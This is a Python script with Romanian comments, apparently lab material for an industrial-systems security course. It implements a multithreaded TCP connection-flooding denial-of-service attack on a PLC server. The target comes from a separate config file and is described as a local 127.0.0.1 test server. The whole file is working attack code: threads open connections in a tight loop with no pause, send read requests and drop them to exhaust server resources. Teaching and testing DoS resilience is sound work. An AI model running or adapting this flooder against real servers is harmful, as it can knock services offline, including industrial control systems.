"""
attacker.py
-----------
PAS 3 din cerinta proiectului: atacator care "inunda" serverul PLC cu
pachete/conexiuni, pentru a demonstra un atac DoS volumetric la nivel de
aplicatie (connection/request flooding).

ATENTIE / scop: acest script este facut EXCLUSIV pentru a ataca propriul
server local de test (127.0.0.1, definit in common.py), ca material didactic
de laborator pentru cursul de Securitatea sistemelor industriale. Nu schimba
tinta catre o adresa care nu iti apartine.

Strategia de atac:
  - N fire de executie (THREADS), fiecare in bucla stransa:
    deschide o conexiune TCP noua, trimite o cerere (uneori valida, uneori
    malformata - oricum serverul trebuie sa o proceseze/respinga), si
    inchide conexiunea imediat ("fire and forget", fara sa astepte raspunsul
    mai mult decat strictul necesar). Scopul e sa maximizam numarul de
    conexiuni/secunda trimise catre server, nu sa simulam un client corect.

Rulare:
    python attacker.py [durata_secunde] [nr_thread-uri]

Exemplu (atac de 30s cu 50 de thread-uri concurente):
    python attacker.py 30 50
"""

import socket
import threading
import time
import sys
import random

from common import HOST, PORT

DURATION_SEC_DEFAULT = 30
THREADS_DEFAULT = 50
CONNECT_TIMEOUT = 1.0

stop_flag = threading.Event()
sent_count_lock = threading.Lock()
sent_count = 0
error_count = 0


def attacker_worker():
    global sent_count, error_count
    while not stop_flag.is_set():
        try:
            reg = random.randint(0, 19)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(CONNECT_TIMEOUT)
            s.connect((HOST, PORT))
            s.sendall(f"READ {reg}\n".encode())
            # Nu asteptam raspunsul (sau asteptam foarte putin) - un
            # atacator real nu are niciun interes sa primeasca raspunsul,
            # vrea doar sa consume resurse pe server.
            try:
                s.settimeout(0.05)
                s.recv(64)
            except Exception:
                pass
            s.close()
            with sent_count_lock:
                sent_count += 1
        except Exception:
            with sent_count_lock:
                error_count += 1
            # fara sleep: reincercam imediat, cat mai agresiv posibil


def main():
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else DURATION_SEC_DEFAULT
    n_threads = int(sys.argv[2]) if len(sys.argv) > 2 else THREADS_DEFAULT

    print(f"[attacker] Atac asupra {HOST}:{PORT} cu {n_threads} fire de executie, "
          f"timp de {duration:.0f}s ...")

    threads = [threading.Thread(target=attacker_worker, daemon=True) for _ in range(n_threads)]
    start = time.time()
    for t in threads:
        t.start()

    try:
        while (time.time() - start) < duration:
            time.sleep(1.0)
            with sent_count_lock:
                s, e = sent_count, error_count
            print(f"  [t={time.time()-start:5.1f}s] conexiuni_trimise={s}  erori={e}")
    except KeyboardInterrupt:
        pass
    finally:
        stop_flag.set()
        for t in threads:
            t.join(timeout=1.0)

    with sent_count_lock:
        s, e = sent_count, error_count
    print(f"[attacker] Gata. Total conexiuni trimise: {s}, erori/respinse: {e}")


if __name__ == "__main__":
    main()
